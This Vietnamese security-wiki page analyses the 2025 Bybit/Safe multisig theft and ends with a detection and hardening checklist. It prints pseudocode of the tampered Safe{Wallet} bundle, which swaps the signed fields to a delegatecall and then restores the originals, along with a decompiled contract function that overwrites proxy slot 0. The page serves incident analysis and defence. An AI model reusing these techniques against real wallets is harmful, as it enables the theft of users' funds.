# Chiếm quyền quy trình ký Web3 & takeover proxy Safe bằng delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Tổng quan

Một chuỗi đánh cắp ví lạnh đã kết hợp **supply-chain compromise giao diện web Safe{Wallet}** với **primitive delegatecall on-chain ghi đè con trỏ implementation của proxy (slot 0)**. Những điểm chính cần lưu ý:

- Nếu một dApp có thể chèn code vào quy trình ký, nó có thể khiến signer tạo **chữ ký EIP-712 hợp lệ trên các trường do attacker chọn**, đồng thời khôi phục dữ liệu UI ban đầu để các signer khác không nhận ra.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- Proxy Safe lưu `masterCopy` (implementation) tại **storage slot 0**. Delegatecall tới một contract ghi dữ liệu vào slot 0 trên thực tế sẽ “nâng cấp” Safe sang logic của attacker, trao cho attacker toàn quyền kiểm soát ví.<sup>[[3]](#references)</sup>

## Off-chain: Thao túng có chọn lọc dữ liệu ký trong Safe{Wallet}

Một bundle Safe bị sửa đổi (`_app-*.js`) đã nhắm mục tiêu có chọn lọc vào các địa chỉ Safe và signer cụ thể. Logic được chèn vào thực thi ngay trước lệnh gọi ký:<sup>[[1]](#references)[[3]](#references)</sup>

```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
  tx.data.to = attackerContract;
  tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
  tx.data.operation = 1;                 // delegatecall
  tx.data.value = 0;
  tx.data.safeTxGas = 45746;
  const sig = await sdk.signTransaction(tx, safeVersion);
  sig.data = orig;                       // restore original before submission
  tx.data = orig;
  return sig;
}
```

### Thuộc tính của cuộc tấn công
- **Giới hạn theo ngữ cảnh**: allowlist hard-coded cho Safe/người ký là nạn nhân giúp tránh gây chú ý và giảm khả năng bị phát hiện.<sup>[[1]](#references)[[3]](#references)</sup>
- **Thay đổi vào phút chót**: các trường (`to`, `data`, `operation`, gas) bị ghi đè ngay trước `signTransaction`, rồi được khôi phục, khiến payload đề xuất trong UI trông vô hại trong khi chữ ký khớp với payload của kẻ tấn công.<sup>[[3]](#references)</sup>
- **EIP-712 thiếu minh bạch**: ví hiển thị dữ liệu có cấu trúc nhưng không giải mã calldata lồng nhau hoặc làm nổi bật `operation = delegatecall`, khiến thông điệp đã bị thay đổi về cơ bản được ký mù.<sup>[[3]](#references)[[4]](#references)</sup>

### Mức độ liên quan của xác thực Gateway
Các đề xuất Safe được gửi đến **Safe Client Gateway**.<sup>[[5]](#references)</sup> Trước khi có các bước kiểm tra được tăng cường, gateway có thể chấp nhận đề xuất trong đó `safeTxHash`/chữ ký tương ứng với các trường khác với phần thân JSON nếu UI ghi đè chúng sau khi ký. Sau sự cố, gateway từ chối các đề xuất có hash/chữ ký không khớp với giao dịch được gửi lên.<sup>[[3]](#references)</sup> Cần áp dụng xác minh hash phía máy chủ tương tự cho mọi API điều phối ký.

### Điểm nổi bật của sự cố Bybit/Safe năm 2025
- Vụ rút tiền từ ví lạnh Bybit ngày 21 tháng 2 năm 2025 (~401k ETH) lặp lại cùng một phương thức: một bundle S3 của Safe bị xâm phạm chỉ kích hoạt với người ký Bybit và đổi `operation=0` → `1`, trỏ `to` đến một contract của kẻ tấn công đã được triển khai trước đó, có chức năng ghi vào slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- Tệp `_app-52c9031bfa03da47.js` được lưu trong bộ nhớ đệm Wayback cho thấy logic nhắm đến Safe của Bybit (`0x1db9…cf4`) và các địa chỉ người ký, sau đó lập tức khôi phục bundle sạch hai phút sau khi thực thi, tương tự thủ thuật “thay đổi → ký → khôi phục”.<sup>[[1]](#references)[[2]](#references)</sup>
- Contract độc hại (ví dụ: `0x9622…c7242`) chứa các hàm đơn giản `sweepETH/sweepERC20` cùng một hàm `transfer(address,uint256)` ghi vào implementation slot. Việc thực thi `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` đã thay đổi implementation của proxy và trao toàn quyền kiểm soát.<sup>[[1]](#references)[[3]](#references)</sup>

## Trên chain: Chiếm quyền proxy bằng delegatecall thông qua va chạm slot

Safe proxy lưu `masterCopy` tại **storage slot 0** và delegate toàn bộ logic cho nó. Vì Safe hỗ trợ **`operation = 1` (delegatecall)**, bất kỳ giao dịch đã ký nào cũng có thể trỏ đến một contract tùy ý và thực thi mã của contract đó trong ngữ cảnh storage của proxy.<sup>[[3]](#references)</sup>

Contract của kẻ tấn công giả lập `transfer(address,uint256)` của ERC-20 nhưng thay vào đó ghi `_to` vào slot 0:<sup>[[1]](#references)[[3]](#references)</sup>

```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
    stor0 = uint256(uint160(_to));
}
```

Đường dẫn thực thi:<sup>[[1]](#references)[[3]](#references)</sup>
1. Nạn nhân ký `execTransaction` với `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy xác thực chữ ký trên các tham số này.
3. Proxy thực hiện delegatecall vào `attackerContract`; phần thân `transfer` ghi vào slot 0.
4. Slot 0 (`masterCopy`) giờ trỏ đến logic do kẻ tấn công kiểm soát → **chiếm quyền hoàn toàn ví và rút sạch tiền**.

### Ghi chú về Guard và phiên bản (tăng cường bảo mật sau sự cố)
- Transaction guard được giới thiệu trong Safe v1.3.0 và có thể kiểm tra tất cả tham số `execTransaction` trước khi thực thi; guard có thể từ chối `delegatecall` hoặc áp dụng chính sách cho địa chỉ đích và calldata. Bybit chạy v1.1.1, phiên bản ra đời trước khi có hook này.<sup>[[2]](#references)[[6]](#references)</sup>

## Danh sách kiểm tra phát hiện và tăng cường bảo mật

- **Tính toàn vẹn của UI**: ghim các JS asset / SRI; theo dõi khác biệt giữa các bundle; xem UI ký giao dịch là một phần của ranh giới tin cậy.
- **Xác thực lúc ký**: dùng hardware wallet có **EIP-712 clear-signing**; hiển thị rõ `operation` và giải mã calldata lồng nhau. Từ chối ký khi `operation = 1`, trừ khi chính sách cho phép điều đó.<sup>[[3]](#references)</sup>
- **Kiểm tra hash phía máy chủ**: các gateway/service chuyển tiếp đề xuất phải tính lại `safeTxHash` và xác thực chữ ký khớp với các trường đã gửi.<sup>[[3]](#references)</sup>
- **Chính sách/allowlist**: áp dụng quy tắc kiểm tra trước cho `to`, selector, loại tài sản và cấm delegatecall, trừ các luồng đã được kiểm duyệt. Yêu cầu dịch vụ chính sách nội bộ phê duyệt trước khi phát đi các giao dịch đã ký đầy đủ.
- **Thiết kế hợp đồng**: tránh cho phép delegatecall tùy ý trong ví multisig/treasury, trừ khi thực sự cần thiết. Coi mọi con trỏ triển khai là một cơ chế nâng cấp: bảo vệ bằng kiểm soát truy cập rõ ràng và giới hạn mục tiêu/selector của delegatecall; chỉ chuyển con trỏ sang một slot khác không phải là biện pháp phòng thủ đầy đủ.<sup>[[3]](#references)[[6]](#references)</sup>
- **Giám sát**: cảnh báo khi ví nắm giữ tiền treasury thực thi delegatecall, cũng như khi đề xuất thay đổi `operation` khỏi các mẫu `call` thông thường.

## References

- [1] [Phân tích pháp chứng của AnChain.AI về vụ khai thác Safe của Bybit](https://www.anchain.ai/blog/bybit)
- [2] [Phân tích của Zero Hour Technology về vụ xâm phạm bundle của Safe](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Phân tích kỹ thuật chuyên sâu về vụ hack Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Nhật ký thay đổi Safe smart account v1.3.0 (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
